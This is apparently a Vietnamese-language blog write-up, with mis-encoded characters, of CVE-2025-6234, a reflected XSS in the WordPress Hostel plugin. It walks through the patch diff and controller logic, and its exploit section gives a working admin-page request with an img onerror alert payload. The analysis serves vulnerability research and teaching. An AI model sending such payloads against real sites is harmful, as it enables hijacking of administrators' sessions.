---
title: CVE-2025-6234 Analysis & POC
description: Security Vulnerability in WordPress Hostel Plugin.
date: 2025-10-02 20:00:00 +0700
categories: [CVE Analyst]
tags: [analyst, plugin, xss]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

Lá»— há»•ng xáº£y ra trÃªn plugin **Hostel** cá»§a WordPress trÆ°á»›c phiÃªn báº£n **1.1.5.8**. Káº» táº¥n cÃ´ng cÃ³ thá»ƒ lá»£i dá»¥ng lá»— há»•ng nÃ y Ä‘á»ƒ táº¥n cÃ´ng ngÆ°á»i dÃ¹ng cÃ³ quyá»n cao nhÆ° **admin**.

* **CVE ID**: [CVE-2025-6234](https://www.cve.org/CVERecord?id=CVE-2025-6234)
* **Product**: [WordPress Hostel Plugin](https://wordpress.org/plugins/hostel/)
* **Vulnerability Type**: Cross Site Scripting
* **Affected Versions**: < 1.1.5.8
* **CVSS severity**: Medium (7.1)
* **Required Privilege**: Unauthenticated

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Hostel Plugin**:  v1.1.5.7(vul) vÃ  v1.1.5.8(fix)
* **diff tool**: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version

## Analysis

NguyÃªn nhÃ¢n gá»‘c rá»… do khÃ´ng thá»±c hiá»‡n **sanitize** (lÃ m sáº¡ch dá»¯ liá»‡u) vÃ  **escape** (mÃ£ hÃ³a dá»¯ liá»‡u Ä‘áº§u ra) Ä‘á»‘i vá»›i má»™t tham sá»‘ trÆ°á»›c khi pháº£n há»“i láº¡i trÃªn trang, dáº«n Ä‘áº¿n lá»— há»•ng **Reflected Cross-Site Scripting (XSS)**

### Patch Diff

DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡.
CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ 2 file **views/bookings.html.php** vÃ  **controllers/bookings.php**

**File views/bookings.html.php**

```php
<p align="center">
    <?php if($offset > 0):?>
        <a href="admin.php?page=wphostel_bookings&type=<?php echo $type?>&offset=<?php echo $offset - $page_limit?>&ob=<?php echo @$_GET['ob']?>"><?php _e('[previous page]', 'wphostel')?></a>
    <?php endif;?> 
    <?php if($count > ($page_limit + $offset)):?>
        <a href="admin.php?page=wphostel_bookings&type=<?php echo $type?>&offset=<?php echo $offset + $page_limit?>&ob=<?php echo @$_GET['ob']?>"><?php _e('[next page]', 'wphostel')?></a>
    <?php endif;?>	
</p>
```

Tham sá»‘ `ob` Ä‘Æ°á»£c láº¥y trá»±c tiáº¿p tá»« `$_GET['ob']` vÃ  echo ra HTML attribute mÃ  **khÃ´ng cÃ³ báº¥t kÃ¬ xá»­ lÃ½ escape** nÃ o. Äiá»u nÃ y dáº«n Ä‘áº¿n nguy cÆ¡ **Reflected XSS (Cross-Site Scripting)**, vÃ¬ attacker cÃ³ thá»ƒ chÃ¨n payload vÃ o query string,

```php
<p align="center">
    <?php if($offset > 0):?>
        <a href="admin.php?page=wphostel_bookings&type=<?php echo $type?>&offset=<?php echo $offset - $page_limit?>&ob=<?php echo esc_attr($_GET['ob'] ?? '')?>"><?php _e('[previous page]', 'wphostel')?></a>
    <?php endif;?> 
    <?php if($count > ($page_limit + $offset)):?>
        <a href="admin.php?page=wphostel_bookings&type=<?php echo $type?>&offset=<?php echo $offset + $page_limit?>&ob=<?php echo esc_attr($_GET['ob'] ?? '')?>"><?php _e('[next page]', 'wphostel')?></a>
    <?php endif;?>	
</p>
```

Báº£n vÃ¡ Ä‘Ã£ sá»­ dá»¥ng hÃ m `esc_attr()` Ä‘á»ƒ encode `$_GET['ob']` thÃ nh dáº¡ng an toÃ n trÆ°á»›c khi echo ra HTML attribute.

{{< figure src="diff_code.png" caption="Diff giá»¯a code dá»… bá»‹ lá»—i vÃ  code Ä‘Ã£ vÃ¡" >}}

* Source: `$_GET['ob']` lÃ  dá»¯ liá»‡u nháº­p tá»« **client (URL query string)**, attacker cÃ³ thá»ƒ kiá»ƒm soÃ¡t hoÃ n toÃ n.
* Sink: echo trong **HTML attribute** `ob=<?php echo @$_GET['ob']?>`

ğŸ‘‰ VÃ¬ source khÃ´ng Ä‘i qua **logic cá»§a controllers** nÃªn ta khÃ´ng cáº§n quan tÃ¢m diff cá»§a `controllers/bookings.php`

### How it work?

Äá»ƒ `$_GET['ob']` Ä‘Æ°á»£c echo ra HTML attribute cá»§a tháº» `<a>` thÃ¬ Ä‘iá»u kiá»‡n trong khá»‘i `if` chá»©a tháº» `<a>` pháº£i `true`

```php
<?php if($offset > 0):?>
// ob=<?php echo @$_GET['ob']?>
<?php endif;?> 
<?php if($count > ($page_limit + $offset)):?>
// ob=<?php echo @$_GET['ob']?>
<?php endif;?>	
```

ğŸ‘‰ Äiá»u kiá»‡n quan trá»ng cáº§n chÃº Ã½ lÃ  `if($offset > 0)`, vÃ¬ chá»‰ cáº§n Ä‘iá»u kiá»‡n nÃ y Ä‘Ãºng thÃ¬ XSS Ä‘Ã£ cÃ³ thá»ƒ xáº£y ra. KhÃ´ng cáº§n quan tÃ¢m `if($count > ($page_limit + $offset))`.

File **views/bookings.html.php** khÃ´ng thá»ƒ truy cáº­p trá»±c tiáº¿p, mÃ  pháº£i Ä‘Æ°á»£c **controllers** gá»i thÃ´ng qua hÃ m `include()`

Biáº¿n `$offset` Ä‘Æ°á»£c **controller** khá»Ÿi táº¡o trÆ°á»›c rá»“i truyá»n sang **view** (**views/bookings.html.php**) Ä‘á»ƒ dÃ¹ng trong má»‡nh Ä‘á» `if`.

Äá»ƒ xÃ¡c Ä‘á»‹nh **controller** nÃ o gá»i file view nÃ y, ta tÃ¬m kiáº¿m biáº¿n `$offset` trong thÆ° má»¥c controllers cá»§a plugin.

{{< figure src="search_controllers.png" caption="TÃ¬m biáº¿n $offset trong thÆ° má»¥c controllers" >}}

Káº¿t quáº£ cho tháº¥y `$offset` Ä‘Æ°á»£c táº¡o trong nhÃ¡nh `default` (**listing bookings**) cá»§a hÃ m tÄ©nh `manage()` trong class `WPHostelBookings`, náº±m á»Ÿ file **controllers/bookings.php**.

**Controller Code**

```php
class WPHostelBookings {
    static function manage() {
        global $wpdb;
        $_booking = new WPHostelBooking();

        switch(@$_GET['do']) {
            // other logic
            
            // list bookings
            default:
                // which bookings to show - upcoming or past?
                $type = empty($_GET['type']) ? 'upcoming' : sanitize_text_field($_GET['type']);
                $offset = empty($_GET['offset']) ? 0 : intval($_GET['offset']);
                $dir = empty($_GET['dir']) ? 'ASC' : $_GET['dir'];
                if($dir != 'ASC' and $dir != 'DESC') $dir = 'ASC';
                $odir = ($dir == 'ASC') ? 'DESC' : 'ASC';
                
                // other logic
                
                // define limit (as it's paginated)				
                $page_limit = 20;
                $limit_sql = empty($_GET['export']) ? $wpdb->prepare("LIMIT %d, %d", $offset, $page_limit) : ''; 
                
                // other logic	
                
                $bookings = $wpdb->get_results("SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room 
                    FROM ".WPHOSTEL_BOOKINGS." tB JOIN ".WPHOSTEL_ROOMS." tR ON tR.id = tB.room_id
                    WHERE is_static=0 $where_sql $orderby $limit_sql");
                $count = $wpdb->get_var("SELECT FOUND_ROWS()");	
                
                // other logic

                if(@file_exists(get_stylesheet_directory().'/wphostel/bookings.html.php')) include get_stylesheet_directory().'/wphostel/bookings.html.php';
                else include(WPHOSTEL_PATH."/views/bookings.html.php");				  
            break;
        }
    }
}
```

**PhÃ¢n tÃ­ch biáº¿n `$offset`**

Biáº¿n `$offset` Ä‘Æ°á»£c khá»Ÿi táº¡o tá»« tham sá»‘ `offset` trong **URL** (`$_GET['offset']`):

* Náº¿u khÃ´ng cÃ³ tham sá»‘ => máº·c Ä‘á»‹nh `0`.
* Náº¿u cÃ³ => Ã©p kiá»ƒu sá»‘ nguyÃªn báº±ng `intval()`.

```php
$offset = empty($_GET['offset']) ? 0 : intval($_GET['offset']);
```

**PhÃ¢n tÃ­ch biáº¿n `$page_limit`**

`$page_limit` Ä‘Æ°á»£c Ä‘áº·t cá»‘ Ä‘á»‹nh lÃ  `20`, dÃ¹ng káº¿t há»£p vá»›i `$offset` Ä‘á»ƒ phÃ¢n trang:

```php
// define limit (as it's paginated)				
$page_limit = 20;

// LIMIT offset, 20
$limit_sql = empty($_GET['export']) ? $wpdb->prepare("LIMIT %d, %d", $offset, $page_limit) : ''; 
```

Khi Ä‘Ã³ SQL tráº£ vá» tá»‘i Ä‘a **20 báº£n ghi**, báº¯t Ä‘áº§u tá»« vá»‹ trÃ­ `$offset`.

**Ãp dá»¥ng vÃ o má»‡nh Ä‘á» if**:

Trong view, Ä‘oáº¡n code XSS payload chá»‰ hiá»ƒn thá»‹ khi:

* `if($offset > 0)` => tá»©c lÃ  pháº£i cÃ³ offset tá»« **1 trá»Ÿ lÃªn**.
* Muá»‘n `offset > 0` cÃ³ Ã½ nghÄ©a, cÆ¡ sá»Ÿ dá»¯ liá»‡u pháº£i cÃ³ Ã­t nháº¥t **2 booking**. Náº¿u chá»‰ cÃ³ 1 booking thÃ¬ sau khi bá» qua 1 dÃ²ng (offset=1), khÃ´ng cÃ²n dá»¯ liá»‡u nÃ o Ä‘á»ƒ hiá»ƒn thá»‹, nÃªn payload cÅ©ng khÃ´ng render ra.

ğŸ‘‰ Do Ä‘Ã³, Ä‘á»ƒ khai thÃ¡c thÃ nh cÃ´ng, cáº§n cÃ³ tá»‘i thiá»ƒu **2 booking** trong database.

Cuá»‘i cÃ¹ng cÃ¡c káº¿t quáº£ Ä‘Æ°á»£c chá»©a trong cÃ¡c biáº¿n sáº½ Ä‘Æ°á»£c hiá»ƒn thá»‹ ra views thÃ´ng qua hÃ m `include()`

```php
if(@file_exists(get_stylesheet_directory().'/wphostel/bookings.html.php')) include get_stylesheet_directory().'/wphostel/bookings.html.php';
else include(WPHOSTEL_PATH."/views/bookings.html.php");	
```

`WPHOSTEL_PATH` cÃ³ thá»ƒ lÃ  háº±ng global Ä‘Æ°á»£c sá»­ dá»¥ng sau khi file **PHP** chá»©a nÃ³ Ä‘Æ°á»£c load, Äá»ƒ biáº¿t Ä‘Æ°á»£c chÃ­nh xÃ¡c, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a `WPHOSTEL_PATH`.

{{< figure src="search_path.png" caption="ÄÆ°á»ng dáº«n tuyá»‡t Ä‘á»‘i tá»›i thÆ° má»¥c plugin" >}}

## Exploit

**Request vá»›i XSS payload**

```http
GET /wp-admin/admin.php?page=wphostel_bookings&type=upcoming&offset=1&ob="><img+src%3D1+onerror%3Dalert%28document.domain%29> HTTP/1.1
```

**Payload thá»±c táº¿**:

```html
"><img src=x onerror=alert(document.domain)>
```

* ÄÃ³ng tháº» `<a>` báº±ng kÃ½ tá»± `">`.
* ChÃ¨n thÃªm tháº» `<img>` cÃ³ thuá»™c tÃ­nh `onerror` Ä‘á»ƒ **kÃ­ch hoáº¡t JavaScript**.
* DÃ¹ng `alert(document.domain)` thay cho `alert(1)` nhÆ° má»™t thÃ³i quen, nháº±m chá»©ng minh rÃµ rÃ ng kháº£ nÄƒng Ä‘á»c thÃ´ng tin tá»« DOM. Äiá»u nÃ y cÅ©ng giÃºp trÃ¡nh trÆ°á»ng há»£p [Sandbox Domain](https://bughunters.google.com/learn/invalid-reports/web-platform/xss/6619189462433792/xss-in-sandbox-domains) khiáº¿n cho tÃ¡c Ä‘á»™ng cá»§a `payload` bá»‹ xem nháº¹ hoáº·c khÃ´ng cÃ³.

**Káº¿t quáº£**:

{{< figure src="xss_success.png" caption="XSS pháº£n chiáº¿u thÃ nh cÃ´ng" >}}

## Conclusion

Lá»— há»•ng **CVE-2025-6234** trong plugin **WordPress Hostel** báº¯t nguá»“n tá»« viá»‡c khÃ´ng xá»­ lÃ½ Ä‘Ãºng dá»¯ liá»‡u Ä‘áº§u vÃ o `($_GET['ob'])` trÆ°á»›c khi pháº£n há»“i láº¡i trÃªn giao diá»‡n. Äiá»u nÃ y má»Ÿ ra kháº£ nÄƒng cho attacker chÃ¨n mÃ£ Ä‘á»™c **Reflected XSS**.

Báº£n vÃ¡ Ä‘Ã£ kháº¯c phá»¥c báº±ng cÃ¡ch sá»­ dá»¥ng hÃ m `esc_attr()` Ä‘á»ƒ escape dá»¯ liá»‡u trÆ°á»›c khi in ra HTML, Ä‘áº£m báº£o ráº±ng cÃ¡c giÃ¡ trá»‹ khÃ´ng tin cáº­y khÃ´ng thá»ƒ chÃ¨n script Ä‘á»™c háº¡i.

**Key takeaways**:

* LuÃ´n **sanitize** dá»¯ liá»‡u Ä‘áº§u vÃ o vÃ  **escape** dá»¯ liá»‡u Ä‘áº§u ra theo ngá»¯ cáº£nh (context).
* Vá»›i WordPress, táº­n dá»¥ng cÃ¡c hÃ m built-in nhÆ° `sanitize_text_field()`, `esc_attr()`, `esc_html()`, `wp_kses()`... Ä‘á»ƒ giáº£m thiá»ƒu rá»§i ro báº£o máº­t.

## References

[XSSCross-site scripting (XSS) cheat sheet - PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

[WordPress Hostel Plugin < 1.1.5.8 is vulnerable to Cross Site Scripting (XSS) - patchstack](https://patchstack.com/database/wordpress/plugin/hostel/vulnerability/wordpress-hostel-plugin-1-1-5-8-reflected-xss-vulnerability)
